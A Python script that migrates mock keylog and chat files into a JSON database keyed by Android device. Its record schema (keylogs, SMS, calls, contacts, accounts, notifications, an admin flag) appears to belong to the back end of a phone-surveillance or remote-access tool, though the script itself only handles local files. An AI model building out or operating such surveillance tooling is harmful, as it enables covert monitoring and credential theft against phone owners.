import os
import json
import time

DB_FILE = 'database.json'
parent_dir = '..'

database = {}

def load_file(filename, encoding='utf-16'):
    path = os.path.join(parent_dir, filename)
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding=encoding) as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading {filename} with encoding {encoding}: {e}")
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e2:
                print(f"Error loading {filename} with utf-8: {e2}")
    return {}

print("Migrating mock data into database.json...")

for device in ['samsung', 'le2121']:
    print(f"Processing device: {device}")
    
    # Initialize record
    database[device] = {
        "_id": device,
        "lastSeen": int(time.time() * 1000) - 60000 * 5, # 5 mins ago
        "info": {
            "model": device.upper(),
            "man": "Google" if device == 'le2121' else "Samsung",
            "ver": "12" if device == 'le2121' else "13",
            "admin": True,
            "battery": "85",
            "charging": False,
            "locked": False
        },
        "calls": {},
        "sms": {},
        "contacts": {},
        "apps": {},
        "accounts": {},
        "keylogs": {},
        "notifications": {},
        "media": {},
        "chats": {}
    }
    
    # Load Keylogs
    keylogs_data = load_file(f"keylogs_{device}.json")
    if keylogs_data:
        print(f"  Loaded {len(keylogs_data)} keylogs")
        database[device]["keylogs"] = keylogs_data
        
    # Load Chats
    chats_data = load_file(f"chats_{device}.json")
    if chats_data:
        print(f"  Loaded {len(chats_data)} chat categories")
        database[device]["chats"] = chats_data

# Save to database
with open(DB_FILE, 'w', encoding='utf-8') as f:
    json.dump(database, f, indent=2, ensure_ascii=False)

print("Migration completed! database.json created successfully.")
